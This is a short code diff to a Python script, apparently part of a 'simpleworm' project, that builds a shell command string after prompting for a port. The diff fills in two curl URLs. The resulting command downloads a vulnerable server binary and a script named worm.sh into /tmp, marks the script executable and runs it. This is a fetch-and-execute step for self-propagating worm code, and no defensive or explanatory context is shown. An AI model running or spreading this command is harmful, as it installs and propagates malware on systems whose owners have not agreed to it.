@@ -5,9 +5,9 @@ import subprocess
 port = int(input("Enter port: "))
 
 shell_commands = (
-    "curl -o /tmp/vulserver https://raw.githubusercontent.com/"
+    "curl -o /tmp/vulserver https://raw.githubusercontent.com/paultheal1en/simpleworm/main/vul_server"
     "; sleep 3;"
-    "curl -o /tmp/worm.sh https://raw.githubusercontent.com/"
+    "curl -o /tmp/worm.sh https://raw.githubusercontent.com/paultheal1en/simpleworm/main/worm.sh"
     "; sleep 3; chmod +x /tmp/worm.sh; /tmp/worm.sh\n"
 )
 
